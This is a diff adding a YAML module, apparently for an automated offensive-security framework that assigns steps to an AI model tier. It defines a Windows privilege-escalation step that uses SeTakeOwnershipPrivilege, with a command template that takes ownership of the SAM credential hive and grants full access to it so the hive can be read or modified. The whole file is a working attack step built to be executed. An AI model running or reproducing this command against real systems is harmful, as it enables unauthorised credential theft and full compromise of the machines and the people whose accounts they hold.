@@ -1,0 +1,16 @@
+name: setakeownership
+category: privesc
+description: SeTakeOwnershipPrivilege exploitation
+preconditions:
+  - os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "takeown /f C:\Windows\System32\config\SAM && icacls C:\Windows\System32\config\SAM /grant administrators:F"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "SeTakeOwnershipPrivilege: take ownership of any object. Take ownership of SAM/SYSTEM hives, or sensitive files, then read/modify."
